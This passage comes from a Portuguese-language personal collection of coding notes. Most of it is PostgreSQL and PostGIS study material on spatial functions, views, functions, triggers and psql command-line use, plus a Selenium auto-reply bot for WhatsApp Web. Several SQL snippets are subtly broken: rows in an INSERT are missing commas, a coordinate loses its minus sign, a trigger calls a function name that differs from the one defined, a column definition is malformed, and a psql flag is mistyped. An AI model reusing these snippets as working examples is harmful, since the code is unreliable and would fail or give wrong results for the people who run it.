\n\"0106000020E610000001000000010300000002000000040000007B14AE47E1BA52C09A99999999594540A4703D0AD7C352C07B14AE47E15A454014AE47E17AC452C052B81E85EB5145407B14AE47E1BA52C09A99999999594540050000000000000000C052C014AE47E17A5445400000000000C052C052B81E85EB5145401F85EB51B8BE52C052B81E85EB5145401F85EB51B8BE52C014AE47E17A5445400000000000C052C014AE47E17A544540\"\n\n#################################################################\n\n/*\nST_PointFromText() cria o objeto geom\u00e9trico a partir de uma\nrepresenta\u00e7\u00e3o textual seguido do SRID 4326, sistema de referencial\ngeogr\u00e1fico, sistema mundial geod\u00e9sico WGS84, no momento de sua cria\u00e7ao\n\nST_MakePoint(-74.9233606, 42.699992) cria objeto geom\u00e9trico a partir\nde um valor estilo numeric, por\u00e9m n\u00e3o tem o SRID, sistema de refer\u00eancia\ngeogr\u00e1fico, sistema mundial geod\u00e9sico WGS84. nesse caso, se preciso, o \nSRID ser\u00e1 acidionado depois.\n\nST_SetSRID(ST_MakePoint(-74.9233606, 42.699992), 4326); cria o objeto\ngeom\u00e9trico a partir de um valor estilo numeric e o SRID, sistema de\nrefer\u00eancia geogr\u00e1fico, sistema mundial geod\u00e9sio WGS84 \u00e9 iserido posteriormente.\n*/\nSELECT ST_PointFromText('POINT(-74.9233606 42.699992)', 4326)\nSELECT ST_MakePoint(-74.9233606, 42.699992)\nSELECT ST_SetSRID(ST_MakePoint(-74.9233606, 42.699992), 4326)\n\n#################################################################\n\n/*\nST_LineFromText() cria um objeto geom\u00e9trico que leva em considera\u00e7\u00e3o\no SRID WGS84, ele \u00e9 indicado quando voc\u00ea j\u00e1 tem a forma de linha,\npor\u00e9m, caso tenha apenas os pontos, ou seja, os pontos s\u00e3o manipulados\nseparadamente e com valores, geramos os pontos depois a linha \nque os conectam.\n*/\n\nSELECT ST_LineFromText('LINESTRING(-105.90 35.67, -105.91 35.67)',4326);\nSELECT ST_MakeLine(ST_MakePoint(-74.9, 42.7), ST_MakePoint(-74.1, 42.4));\n\n\n#################################################################\n\n\n/*\n1) Fazendo uma pol\u00edgono atrav\u00e9s de multipontos\ndados em coordenadas em strings.\n2) Fazendo um pol\u00edgono a partir de linhas usando a fun\u00e7\u00e3o\nLINESTRING. Nesse caso a coordenas inicial e final devem ser as mesma\npara garantir que o objeto poligonidal esteja fechado.\n3)Fazendo um multipol\u00edgonos usando a fun\u00e7\u00e3o multipol\u00edgono\ncada pol\u00edgono deve ser dado em ((poli1)),((poli2)) como argumentos\nda fun\u00e7\u00e3o.\n\nTodos usando o 4326 que \u00e9 o tipo SRID WGS84, world geodestic sistem\n*/\nSELECT ST_PolygonFromText('POLYGON((-74.9 42.7, -75.1 42.7,\n\t\t\t\t\t\t 75.1 42.6, -74.9 42.7))', 4326);\n\n\nSELECT ST_MakePolygon(\n\tST_GeomFromText('LINESTRING(-74.92 42.7, -75.06 42.71,\n\t\t\t\t   -75.07 42.64, -74.92 42.7)' 4326));\n\nSELECT ST_MPolyFromText('MULTIPOLYGON(\n\t\t\t\t\t   ((-74.92 42.7, -75.06 42.71,\n\t\t\t\t\t   -75.07 42.64, -74.92 42.7)),\n\t\t\t\t\t\t((-75.0 42.66, -75.0 42.64,\n\t\t\t\t\t   -74.98 42.64, -74.98 42.66,\n\t\t\t\t\t   -75.0 42.66))\n\t\t\t\t\t   \n\t\t\t\t\t   )', 4326);\n\n\n\n\n###################################################################\nCREATE TABLE farmers_markets(\n\tfmid bigint PRIMARY KEY,\n\tmarket_name varchar(100) NOT NULL,\n\tstreet varchar(180),\n\tcity varchar(60),\n\tcounty varchar(25),\n\tst varchar(20) NOT NULL,\n\tzip varchar(10),\n\tlongitude numeric(10,7),\n\tlatitude numeric(10,7),\n\torganic varchar(1) NOT NULL\n\t);\n\ngeography \u00e9 o tipo de dados espacial fornecido pela extens\u00e3o PostGIS no PostgreSQL. O tipo geography \u00e9 usado para armazenar dados espaciais na superf\u00edcie da Terra, como pontos, linhas e pol\u00edgonos, e leva em considera\u00e7\u00e3o a curvatura da Terra.\nPOINT especifica que a nova coluna geog_point armazenar\u00e1 dados de pontos geogr\u00e1ficos (coordenadas de latitude e longitude).\n4326 \u00e9 o SRID (Spatial Reference System Identifier) que especifica o sistema de refer\u00eancia espacial WGS84. Isso significa que as coordenadas armazenadas nesta coluna estar\u00e3o no sistema de coordenadas WGS84, que \u00e9 um sistema geod\u00e9sico global\n\nALTER TABLE farmers_markets ADD COLUMN geog_point geography(POINT,4326); \n\n###################################################################\n/*\nCria um INDEX na coluna geog_point que tem as coordendenadas e o tipo de dado(point, linestring, polygon, multipolygon) que facilita na hora das buscas.\nDeve-se usar o indices(INDEX) GisT (Generalized Search Tree) ao invez de Tree-B, \no GisT WKB(codigo coordenada) \u00e9 melhor para dados complexos, geometrias e espaciais,\no Tree-B \u00e9 melhor para linearidade, inser\u00e7\u00f5es, modifica\u00e7\u00f5es etc...\nSem os \u00edndices, o sql vai ter que procurar linha a linha a requisi\u00e7\u00e3o\n\n*/\n\n\nCREATE INDEX market_pts_idx ON farmers_markets USING GIST (geog_point); \n\n###################################################################\n\n/*\nFiltra os market_name de acordo com a dist\u00e2ncia,\na fun\u00e7\u00e3o ST_DWithin(WKB, WKB(1)), verifica que os pontos\nWBK est\u00e3o em um raio de 10000 mil metros ou 10 km, \nvoc\u00ea pode oferecer o WKB(1) j\u00e1 pronto, ou colocar as\ncoordenadas em extrair o WKB(1) com as fun\u00e7\u00f5es\no exemplo desse codigo \u00e9: \nST_GeogFromText('POINT(-93.6204386 41.5853202)')\nEssa fun\u00e7\u00e3o tamb\u00e9m funciona com objetos que aprendemos, \npor\u00e9m se voc\u00ea quiser saber se o objeto est\u00e1 dentro de uma determinada\ndist\u00e2ncia use o ST_DFullWithin(WKB, WKB).\n*/\n\nUPDATE farmers_markets\nSET geog_point = ST_SetSRID(ST_MakePoint(longitude_latitude), 4326)::geography;\n\n\nSELECT longitude, \n\tlatitude, \n\tgeog_point, \n\tST_AsText(geog_point) \nFROM farmers_markets \nWHERE longitude IS NOT NULL \nLIMIT 5; \n\n\n\nSELECT market_name,\n\tcity,\n\tst\nFROM farmers_markets\nWHERE ST_DWithin(geog_point,\n\t\t\t\tST_GeogFromText('POINT(-93.6204386 41.5853202)'),10000)\nORDER BY market_name;\n\n###################################################################\n\n/*\nNesse c\u00f3digo estamos calculando a dist\u00e2ncia geogr\u00e1fica entre\ndois pontos dados em coordenadas string\nST_Distance(ST_GeogFromText(), ST_GeogFromText()), retorna\na dist\u00e2ncia em metros entre os pontos dividimos por 1000, \nporque 10 mil metros divido por 1000 s\u00e3o 10 km, o\nround vem para arredondar o valor, diminuindo as casas decimais\n*/\n\nSELECT round(ST_Distance(\n\tST_GeogFromText('POINT(-73.9283685 40.8296466)'),\n\tST_GeogFromText('POINT(-73.8480153 40.7570917)')\n)::numeric / 1000, 3) AS dist_km_entre_pontos;\n\n\n###################################################################\n\n\nSELECT market_name,\n\tcity,\n\tround((ST_Distance(geog_point, ST_GeogFromText('POINT(-93.6204386 41.5853202)'))/1000)::numeric, 2)\n\tAS km\n\t\nFROM farmers_markets\nWHERE ST_DWithin(geog_point, ST_GeogFromText('POINT(-93.6204386 41.5853202)'), 10000)\nORDER BY km ASC;\n\n\n\n\n\n\n###################################################################\n###################################################################\n/*\nAten\u00e7\u00e3o quando os dados de coordenadas de pontos, multipontos,\nlinhas, poligonos, multipoligonos e etc, estiverem em WKB,\npara usar as fun\u00e7\u00f5es do PostGis, temos que converter esses WKB\npara dados geography(metros), pois o WKB n\u00e3o \u00e9 interpretado corretamente\npelo PostGis, o WKB serve para armazenamento.\ncom o modo geometry \u00e9 retornado em SRID unidades, o que n\u00e3o \u00e9 muito \u00fatilo agora.\n*/\n\nSELECT ST_Area(geom::geography)\nFROM tl_2010_us_county10;\n\n\n###################################################################\n\n/*\nAqui estamos fazendo uma consulta que verifica qual \nestado tem o ponto que passamos em coordenas dentro dele\ncomo por exemplo um ponto dentro do circulo, ent\u00e3o de acordo\ncom a corrdenada que passamos, o ponto est\u00e1 dentro de \nLos Angeles\nperceba que a fun\u00e7\u00e3o ST_Within(geometry, geometry) usa\na unidade de medida geometry e n\u00e3o geography, por n\u00e3o se tratar \nde medidas\n\n*/\n\n\nSELECT name10,\n       statefp10\nFROM tl_2010_us_county10\nWHERE ST_Within(\n    ST_SetSRID('POINT(-118.3419063 34.0977076)'::geometry, 4269),\n    ST_SetSRID(geom, 4269)\n);\n\n\nSELECT name10,\n\tstatefp10\nFROM tl_2010_us_county10\nWHERE ST_Within('SRID=4269; POINT(-118.3419063 \n\t\t\t   34.0977076)'::geometry, geom);\n\n\n\n/*\nNo caso do codigo alternativo ST_GeomFromText j\u00e1 \u00e9\nem formato de geometry, ent\u00e3o n\u00e3o presicamos formatar\nde geometry para geography\n*/\n\nSELECT name10,\n\tstatefp10\nFROM tl_2010_us_county10\nWHERE ST_Within(ST_GeomFromText('POINT(-118.3419063 34.0977076)', 4269), geom);\n\n\n\n###################################################################\n\n\n\n/*\nFazemos uma consulta usando as duas tableas ao mesmo tempo\ncom o JOIN, o ON tem a fun\u00e7\u00e3o ST_Interesects(geom, geom)\nque retorna uma valor booleano e se for verdadeiro, \nconsidera satisfeito o ON, em seguida filtramos o \nrio Santa Fe Riv, e ordenamos\n\n*/\nSELECT water.fullname AS rio_nome,\n\troads.rttyp,\n\troads.fullname AS br\nFROM santafe_linearwater_2016 water \nJOIN santafe_roads_2016 roads\nON ST_Intersects(water.geom, roads.geom)\nWHERE water.fullname = 'Santa Fe Riv'\nORDER BY roads.fullname;\n\n\n###################################################################\n\n/*\nNesse codigo, fazemos uma consulta entre colunas de\nduas tabelas ao mesmo tempo usando o JOIN, mas com\no ST_AsText(ST_Interesction(geom, geom)), conseguimos\nver as coordenadas de intersec\u00e7\u00e3o em str\n*/\n\nSELECT water.fullname AS waterway,\n\troads.rttyp,\n\troads.fullname AS road,\n\tST_AsText(ST_Intersection(water.geom,\n\t\t\t\t\t\t\t roads.geom))\nFROM santafe_linearwater_2016 water JOIN santafe_roads_2016 roads\nON ST_Intersects(water.geom, roads.geom)\nWHERE water.fullname = 'Santa Fe Riv'\nORDER BY roads.fullname;\n\n"}, "shapefile": {"categoria": "SQL ", "codigo": "Estabelecendo a conex\u00e3o entre o aplicativo e o banco de dados\n\n1) Digite shapefile na barra de pesquisa do window e procure o aplicativo\nPostGIS PostGIS Bundle 3 for PostgreSQL x64 16 Shapefile and DBF Loader Exporter\n\n2) V\u00e1 em View connetion details... e coloque o seu Username, password, server host\ne o database, o username vai ser o postgres\n\n3) Entre em op\u00e7\u00f5es e mude o DBF file character engoding para Latin1, temos que fazer isso\nporque o arquivo que estamos trabalhando tem nomes de condados que dependem desse\ntipo de codifica\u00e7\u00e3o. Aperto OK\n\n4) Clique em Adiciona arquivo\nVoc\u00ea deve ter baixado o arquivo shapefile(contem dados de geometria espacial)\ne desempacotar. \nDeve selecionar o arquivo shp\n* Table parece que vai ser o nome da tabela detro no bando postgree(clique caso queira mudar o nome)\n* Na coluna SRID clique duas vezes e digite ('4326') ou USA('4269')\n\n\n\nDentro dele v\u00e3o ter 5 arquivos em 5 formatos diferentes.\nselecione o .shp\nshp: Cont\u00e9m a geometria dos objetos espaciais.\n.shx: \u00cdndice que facilita o acesso r\u00e1pido \u00e0s entidades no arquivo .shp.\n.dbf: Cont\u00e9m os atributos ou dados tabulares associados \u00e0s geometrias.\n.prj: Define o sistema de coordenadas e proje\u00e7\u00e3o dos dados espaciais.\n.cpg: Especifica a codifica\u00e7\u00e3o de caracteres dos dados tabulares.\n.sbn e .sbx: \u00cdndices espaciais que melhoram a performance em consultas e an\u00e1lises.\n\n\n\n\n5) Clique em importar.\n\n6) Mude para o postgre e j\u00e1 podemos fazer as an\u00e1lises com os dados, a tabela j\u00e1 estar\u00e1 la.\n\n"}, "economizando tempo com VIEWS, FUNCTIONS and TRIGGRES": {"categoria": "SQL ", "codigo": "/*\nA linha CREATE OR REPLACE cria uma visualiza\u00e7\u00e3o chamada nevada_counties_pop_2010,\nse o nome j\u00e1 existir, ser\u00e1 substitu\u00eddo pela nova defini\u00e7\u00e3o, \n## VOC\u00ca PODE TRATAR POSTERIORMENTE COMO UMA TABELA POSTERIORMENTE\nusando o SELECT * FROM nevada_counties_pop_2010 voc\u00ea pode perceber isso\n\n\n*/\n\n\nCREATE OR REPLACE VIEW nevada_counties_pop_2010 AS\n\tSELECT geo_name,\n\t\tstate_fips,\n\t\tcounty_fips,\n\t\tp0010001 AS pop_2010\n\tFROM us_counties_2010\n\tWHERE state_us_abreviation = 'NV'\n\tORDER BY county_fips;\n\n####################################################################\n/*\nEsse c\u00f3digo faz uma VIEW igual a outra que fizemos\nanteriormente, porem toda e qualquer atualiza\u00e7\u00e3o\nsegur\u00e1 a obje\u00e7\u00e3o colocada no WHERE, ou seja nesse caso o \nWHERE  dept_id = 1, ent\u00e3o n\u00e3o ser\u00e1 poss\u00edvel a cria\u00e7\u00e3o \nda inser\u00e7\u00e3o de um novo funcion\u00e1rio que tenha o id\ndept_if = 2, isso serve para atualizar sempre a tabela com os dados especificados.\nINSERT INTO employees_tax_dept (first_name, last_name, dept_id) \nVALUES ('Jamil', 'White', 2); \n*/\n\nCREATE OR REPLACE VIEW employees_tax_dept AS\n\tSELECT emp_id,\n\t\tfirst_name,\n\t\tlast_name,\n\t\tdept_id\n\tFROM employees\n\tWHERE dept_id = 1\n\tORDER BY emp_id\n\tWITH LOCAL CHECK OPTION;\n\n####################################################################\n/*\nDeleta a linha toda que corresponde a cl\u00e1usula WHERE\n\n*/\nDELETE FROM employees_tax_dept\nWHERE emp_id = 5;\n\n####################################################################\n\n/*\nNesse codigo estamos criando uma fun\u00e7\u00e3o, se j\u00e1 tiver uma outra\nfun\u00e7\u00e3o, ser\u00e1 sobrescrita. Damos nome a essa fun\u00e7\u00e3o percent_change\ne damos os par\u00e2metros(new_value, old_value, decimal_places)\nusamos o RETURNS numeric AS para o resultados ser devolvido em \nnumeric, caso queira texto, pode ser tamb\u00e9m. Em seguida fazemos os calculos \nusando o SELECT LANGUAGE SQL diz que \u00e9 a linguagem usada para fazer a fun\u00e7\u00e3o\nIMMUTABLE garante que n\u00e3o mude nada na tabela, \nRETURNS NULL ON NULL INPUT garante que a fun\u00e7\u00e3o retorne NULL para \nentradas n\u00e3o previstas com error por exemplo.\n*/\nCREATE OR REPLACE FUNCTION\n\tpercent_change(new_value numeric, \n\t\t\t\t   old_value numeric, \n\t\t\t\t   decimal_places integer DEFAULT 1)\nRETURNS numeric AS \n'SELECT round(((new_value - old_value)/old_value)*100, decimal_places);'\nLANGUAGE SQL\nIMMUTABLE\nRETURNS NULL ON NULL INPUT;\n\n\n####################################################################\n\n\n/*\nCorpo geral da fun\u00e7\u00e3o \nCREATE OR REPLACE FUNCTION update_personal_days()\n    RETURNS void AS $$\nBEGIN\n    -- Corpo da fun\u00e7\u00e3o\nEND;\n$$ LANGUAGE plpgsql;\n\nEstamos criando uma fun\u00e7\u00e3o de atualiza\u00e7\u00e3o de uma tabela, \nCREATE OR REPLACE FUNCTION update_personal_days(), isso \u00e9 a cria\u00e7\u00e3o\nda nova fun\u00e7\u00e3o, dentro do par\u00eanteses n\u00e3o vai nada pois a entrada de argumentos,\nou seja os par\u00e2metros j\u00e1 est\u00e3o dentro da fun\u00e7\u00e3o.\nRETURNS VOID AS $$, iss significa que estamos garantindo que a fun\u00e7\u00e3o n\u00e3o retorna\ndados, apenas executa.\n$$-----$$, isso significa que \u00e9 o come\u00e7o dos c\u00e1culos da fun\u00e7\u00e3o, usamos isso\nporque se usarmos '' aspas simples, todas as aspas dentro dos calculos dever ser\nduplas, isso pode gerar confus\u00e3o na hora de ler.\nCASE usamos para definir possibilidades, o segundo END \u00e9 para finalizar o CASE.\nRAISE NOTICE, isso signfica a mensagem que ser\u00e1 exibida quando a fun\u00e7\u00e3o for\nrealizada\nLANGUAGE plpgsql, a liguagem que foi utilizada.\n*/\n\nCREATE OR REPLACE FUNCTION update_personal_days()\n\tRETURNS void AS $$\n\tBEGIN\n\t\tUPDATE teachers\n\t\tSET personal_days = \n\t\t\tCASE \n\t\t\t\tWHEN(now() - hire_date) BETWEEN '5 years'::interval AND '10 years'::interval THEN 4\n\t\t\t\tWHEN (now() - hire_date) > '10 years'::interval THEN 5\n\t\t\t\tELSE 3\n\t\t\tEND;\n\tRAISE NOTICE 'personal_days updated';\n\tEND;\n\t$$ \n\tLANGUAGE plpgsql;\n\n####################################################################"}, "usando python em fun\u00e7\u00f5es sql": {"codigo": "CREATE EXTENSION plpythonu;\n\n/*\nVoc\u00ea deve instalar o extensor python na hora que estiver instalando o postgres no comuptador\n\n*/\n\n/*\nNessa fun\u00e7\u00e3o estamos dando no input_string o dado em formato\nde texto, em seguida a fun\u00e7\u00e3o retorna texto\ne usamos o re.sub(r', County$','', input_string)\npara remover o County da input_string.\nAten\u00e7\u00e3o o return na parte python deve ser em min\u00fasculo\npois em pyhton \u00e9 em minusculo\n\n*/\n\n\nCREATE OR REPLACE FUNCTION trim_county(input_string text)\nRETURNS text AS $$\n\timport re\n\tcleaned = re.sub(r' County$','', input_string)\n\treturn cleaned\n\t$$\nLANGUAGE plpythonu;", "categoria": "SQL "}, "triggers - gatilhos": {"categoria": "SQL ", "codigo": "Um gatinho de banco de dados executa uma fun\u00e7\u00e3o sempre que um evento especificado, como INSERT, UPDATE ou DELETE ocorre em uma tabela ou visualiza\u00e7\u00e3o. Pode definir um gatilho antes, depois ou durante e voc\u00ea pode confirar para disparar uma vez para cada linha afetada pelo evento ou apenas uma vez por opera\u00e7\u00e3o.\n\n\n######################################################################\n\n\nCREATE TABLE grades (\n\tstudent_id bigint,\n\tcourse_id bigint,\n\tcourse varchar(30) NOT NULL,\n\tgrade varchar(5) NOT NULL,\n\tPRIMARY KEY (student_id, course_id)\n);\n\n\n\nINSERT INTO grades\nVALUES \n\t(1, 1, 'Biology 2', 'F')\n\t(1, 2, 'English 11B', 'D'),\n\t(1, 3, 'World History 11B', 'C')\n\t(1, 4, 'Trig 2', 'B');\n\n\n\n\nCREATE TABLE grades_history(\n\tstudent_id bigint NOT NULL,\n\tcourse_id bigint NOT NULL,\n\tchange_time_timestamp with zone NOT NULL,\n\told_grade varchar(5) NOT NULL, \n\tnew_grade varchar(5) NOT NULL,\n\tPRIMARY KEY (student_id, course_id, change_timestamp)\n\t);\n\n\n\n######################################################################\n\n/*\nNesse c\u00f3digo estamos fazendo uma fun\u00e7\u00e3o de gatilho, \nestamos comparando a coluna grade(nota) da tabela grades(notas), \na fun\u00e7\u00e3o faz o seguinte: \nSe alguma coisa for mudada na coluna grade, gera a NEW.grade e a \nOLD.grade, ou seja, coluna nova e coluna velha, se a coluna for \ndiferente uma da outra, o c\u00f3digo ir\u00e1 inserir na tabela grades_history\nnas colunas selecionadas os valores da coluna anterior grade, mas ir\u00e1 \nadicionar na tabela de hist\u00f3rico de modifica\u00e7\u00e3o apenas a linha que foi\nmodificada, o END IF serve para finalizar o IF depois de BEGIN, \no RETURN NEW; serve para retornar a tabela modificada ultimamente, \npois dessa forma a nova passar\u00e1 a ser a velha, END; em seguida finaliza o \nc\u00f3digo da fun\u00e7\u00e3o, LANGUAGE \u00e9 a linguagem e o $$ $$ s\u00e3o como as aspas para\nevitar problemas.\n*/\nCREATE OR REPLACE FUNCTION record_if_grade_change()\nRETURNS trigger AS\n$$\n\tBEGIN \n\t\tIF NEW.grade <> OLD.grade THEN\n\t\t\tINSERT INTO grades_history(\n\t\t\t\tstudent_id,\n\t\t\t\tcourse_id,\n\t\t\t\tchange_time,\n\t\t\t\tcourse,\n\t\t\t\told_grade,\n\t\t\t\tnew_grade)\n\t\t\t\t\n\t\t\tVALUES\n\t\t\t\t(OLD.student_id,\n\t\t\t\tOLD.course_id,\n\t\t\t\tnow(),\n\t\t\t\tOLD.course,\n\t\t\t\tOLD.grade,\n\t\t\t\tNEW.grade);\n\t\tEND IF;\n\t\tRETURN NEW;\n\tEND;\n$$\nLANGUAGE plpgsql;\n\n######################################################################\n\n\n/*\nNesse c\u00f3digo estamos fazendo um gatilho que dispara depois que a \ntabela grades \u00e9 feita um UPDATE, poderiamos ter escrito BEFORE ou INSTEAD OF ou seja, modificada, \npara cada linha MODIFICADA o TRIGGER(gatilho) dispara 1 vez chamando a \nfun\u00e7\u00e3o de verifica\u00e7\u00e3o record_if_grade_changed(), de forma granular.\nPoderiamos escrever tamb\u00e9m FOR EACH STATEMENT, que seria a cada vez,\nteria registrado como um todo\n*/\n\n\nCREATE TRIGGER grades_update\nAFTER UPDATE\nON grades\nFOR EACH ROW\nEXECUTE PROCEDURE record_if_grade_changed();\n\n\n######################################################################\n\nCREATE TABLE temperature_test(\n\tstation_name varchar(50),\n\tobservation_date date,\n\tmax_temp integer,\n\tmin_temp integer,\n\tmax_temp_group varchar(40),\n\tPRIMARY KEY (station_name, observation_date)\n);\n/*\nNesse c\u00f3digo, estamos criando um gatilho que atauliza uma coluna\ncom base de valores atualizados em outra coluna, o codigo faz a \nan\u00e1lise de temperaturas, ou seja, imprimimos uma temperatura de\n50 fareneits, ele verifica se essa temperatura \u00e9 alta de acordo\ncom essa classifica\u00e7\u00e3o e salva isso essa classifica\u00e7\u00e3o em uma \noutra coluna, o := serve para definir valores para vari\u00e1veis, \no RETURN NEW \u00e9 a atualiza\u00e7\u00e3o da coluna, grosseiramente como um\nINSERT INTO(x) VALUES(x), RETURN NEW retorna a linha que deva ser\ninserida ou modificada.\n\n\n*/\nCREATE OR REPLACE FUNCTION classify_max_temp()\nRETURNS trigger AS\n$$\n\tBEGIN\n\t\tCASE\n\t\t\tWHEN NEW.max_temp >= 90\n\t\t\t\tTHEN NEW.max_temp_group := 'Hot';\n\t\t\tWHEN NEW.max_temp BETWEEN 70 AND 89\n\t\t\t\tTHEN NEW.max_temp_group := 'Warm';\n\t\t\tWHEN NEW.max_temp BETWEEN 50 AND 69 \n\t\t\t\tTHEN NEW.max_temp_group := 'Pleasant';\n\t\t\tWHEN NEW.max_temp BETWEEN 33 AND 49 \n\t\t\t\tTHEN NEW.max_temp_group := 'Cold';\n\t\t\tWHEN NEW.max_temp BETWEEN 20 AND 32 \n\t\t\t\tTHEN NEW.max_temp_group := 'Freezing';\n\t\t\tELSE NEW.max_temp_group := 'Inhumane';\n\t\tEND CASE;\n\t\tRETURN NEW;\n\tEND;\n$$\nLANGUAGE plpgsql;\n\n\n\n\n\n\nCREATE TRIGGER temperature_insert\nBEFORE INSERT\nON temperature_test\nFOR EACH ROW\nEXECUTE PROCEDURE classify_max_temp();"}, "conversador wpp": {"codigo": "from selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.keys import Keys\nimport time\n\n# Configura\u00e7\u00f5es do WebDriver\noptions = webdriver.ChromeOptions()\noptions.add_argument('--user-data-dir=./User_Data')  # Mant\u00e9m o login no WhatsApp Web\ndriver = webdriver.Chrome(executable_path='path/to/chromedriver', options=options)\n\n# Abre o WhatsApp Web\ndriver.get('https://web.whatsapp.com')\n\n# Aguarda que o usu\u00e1rio fa\u00e7a o login manualmente\ninput(\"Pressione Enter ap\u00f3s fazer login no WhatsApp Web e carregar a p\u00e1gina completamente.\")\n\ndef get_last_message():\n    # Seleciona o \u00faltimo chat aberto\n    chats = driver.find_elements(By.CSS_SELECTOR, \"div._1ays2\")\n    last_chat = chats[-1] if chats else None\n\n    if last_chat:\n        # Pega todas as mensagens do \u00faltimo chat\n        messages = last_chat.find_elements(By.CSS_SELECTOR, \"div.message-in, div.message-out\")\n        last_message = messages[-1] if messages else None\n\n        if last_message:\n            # Extrai o texto da \u00faltima mensagem\n            message_text = last_message.find_element(By.CSS_SELECTOR, \"span.selectable-text\").text\n            return message_text\n    return None\n\ndef send_message(reply_text):\n    # Localiza a caixa de texto para digitar a mensagem\n    message_box = driver.find_element(By.CSS_SELECTOR, \"div._3uMse\")\n    message_box.click()\n    message_box.send_keys(reply_text)\n    message_box.send_keys(Keys.RETURN)\n\n# Loop para verificar novas mensagens e responder\nwhile True:\n    try:\n        last_message = get_last_message()\n        if last_message and last_message.lower() == 'bom dia':\n            send_message('Bom dia')\n        time.sleep(5)  # Espera 5 segundos antes de verificar novamente\n    except Exception as e:\n        print(f\"Ocorreu um erro: {e}\")\n        break\n\n# Fecha o WebDriver\ndriver.quit()\n", "categoria": "Programas exemplos"}, "DELETE - deletando linhas": {"codigo": "DELETE FROM table_name\nWHERE column_1 = 'name'", "categoria": "SQL "}, "deletando triggers(gatilhos)": {"codigo": "/*\nPrimeiro desvincule a trigger da tabela, depois delete fu\u00e7\u00e3o\n\n\n*/\n\nDROP TRIGGER minha_trigger\nON minha_tabela;\n\n\nDROP FUNCTION classify_max_temp();", "categoria": "SQL "}, "usando postgresql a partir da linha de comando": {"categoria": "SQL ", "codigo": "1. Abra o Painel de Controle do Windows. Entre no Painel de Controle na pesquisa\nna barra de tarefas do Windows e clique no \u00edcone Painel de Controle.\n2. Dentro do aplicativo Painel de Controle, digite Ambiente na caixa de pesquisa em\ncanto superior direito. Na lista de resultados de pesquisa exibida, clique em Editar o\nVari\u00e1veis \u200b\u200bde ambiente do sistema. Uma caixa de di\u00e1logo Propriedades do sistema deve\naparecer.\n3. Na caixa de di\u00e1logo Propriedades do sistema, na guia Avan\u00e7ado, clique em\nVari\u00e1veis \u200b\u200bambientais. A caixa de di\u00e1logo que se abre deve ter dois\nse\u00e7\u00f5es: Vari\u00e1veis \u200b\u200bde usu\u00e1rio e Vari\u00e1veis \u200b\u200bde sistema. Nas vari\u00e1veis \u200b\u200bdo usu\u00e1rio\nse\u00e7\u00e3o, se voc\u00ea n\u00e3o vir uma vari\u00e1vel PATH, continue na etapa a para criar uma\nnovo. Se voc\u00ea vir uma vari\u00e1vel PATH existente, continue na etapa b para\nmodific\u00e1-lo.\n1. Se voc\u00ea n\u00e3o vir PATH na se\u00e7\u00e3o Vari\u00e1veis \u200b\u200bde usu\u00e1rio, clique em Novo para\nabra uma caixa de di\u00e1logo Nova vari\u00e1vel de usu\u00e1rio, mostrada na Figura 16-1.\nFigura 16-1: Criando uma nova vari\u00e1vel de ambiente PATH no Windows 10\nNa caixa Nome da vari\u00e1vel, insira PATH. No valor da vari\u00e1vel\ncaixa, insira C:\\Program Files\\PostgreSQL\\x.y\\bin, onde x.y \u00e9 o\nvers\u00e3o do PostgreSQL que voc\u00ea est\u00e1 usando. Clique em OK para fechar todos os\ndi\u00e1logos.\n2. Se voc\u00ea vir uma vari\u00e1vel PATH existente nas vari\u00e1veis \u200b\u200bde usu\u00e1rio\nse\u00e7\u00e3o, destaque-a e clique em Editar. Na lista de vari\u00e1veis \u200b\u200bque\nfor exibido, clique em Novo e digite C:\\Program Files\\PostgreSQL\\x.y\\bin,\nonde x.y \u00e9 a vers\u00e3o do PostgreSQL que voc\u00ea est\u00e1 usando. Deveria\nse pare\u00e7a com a linha destacada na Figura 16-2. Quando voc\u00ea \u00e9\nconclu\u00eddo, clique em OK para fechar todas as caixas de di\u00e1logo.\n\n\n#############################################################\n\n1) Ir para o Painel de Controle, pesquise por ambiente, editar as vari\u00e1veis de ambiente do sistema, Avan\u00e7ado, Vari\u00e1veis de ambiente, PATH, clique duas vezes no PATH, coloque o diret\u00f3rio da pasta BIN C:\\Program Files\\PostgreSQL\\16\\bin, pronto, j\u00e1 est\u00e1 pronto para uso.\n\n\nNo CDM \ncaso d\u00ea error\npsql -U postgres d- analysis -P pager=off\n\npsql -U postgres d- analysis\n\nanalysis #= SELECT * FROM teachers;\n\n\n#############################################################\n\nanalysis=# SELECT geo_name\nanalysis-# FROM us_counties_2010\nanalysis-# LIMIT 5;\n\n\n\nanalysis=# CREATE TABLE wineries(\nanalysis(# id bigint,\nanalysis(# winery_name varchar(100)\nanalysis(# );\n\n\n#############################################################\ntirar pagina\u00e7\u00e3o longa, ou seja, quando quermos mostrar algo que cont\u00e9m muitas linhas\nno prompt, demora muito para evidenciar, ent\u00e3o, ele restringe a n\u00e3o todos\n\\pset pager\n\n\n\nMostrar apenas tabelas que come\u00e7am com us\n\\dt+ us* \n\npodemos colocar o + em todos para ter informa\u00e7\u00f5es extras\n\n\\d [padr\u00e3o] Colunas, tipos de dados e outras informa\u00e7\u00f5es sobre objetos\n\\di [padr\u00e3o]\n\u00cdndices e suas tabelas associadas\n\\dt [padr\u00e3o]Tabelas e a conta que as possui\n\\du [padr\u00e3o]Contas de usu\u00e1rio e seus atributos\n\\dv [padr\u00e3o]Visualiza\u00e7\u00f5es e a conta que as possui\n\\dx [padr\u00e3o]\nExtens\u00f5es instaladas\n\n\n\n#############################################################\nexportar a consulta\nanalysis=# \\a \\f , \\pset footer\n\nanalysis=# SELECT * FROM grades;\n\nanalysis=# \\o 'diret\u00f3rio'\n\nanalysis=# SELECT * FROM grades;\n\n\n\n#############################################################\nCriando um banco de dados chamado box_office\ncreatedb -U postgres -e box_office\n\n\n\n#############################################################\nimportando shapefile, trabalhando com coordenadas\nshp2pgsql -I -s SRID -W encoding shapefile_name table_name | psql -d database -U \nuser \n\n\nshp2pgsql -I -s 4269 -W Latin1 tl_2010_us_county10.shp us_counties_2010_shp | psql \n-d \ngis_analysis -U postgres \n\n\n\n-I Adiciona um \u00edndice GiST na coluna de geometria da nova tabela.\n-s Permite especificar um SRID para os dados geom\u00e9tricos.\n-W Permite especificar a codifica\u00e7\u00e3o. (Lembre-se que usamos Latin1 para censo\narquivos de forma.)\nshapefile_name O nome (incluindo o caminho completo) do arquivo que termina com\na extens\u00e3o .shp.\ntable_name O nome da tabela para a qual o shapefile \u00e9 importado.\n\n\n"}, "gerador de senhas..": {"codigo": "import itertools\nimport string\nimport json\n#string.ascii_letters 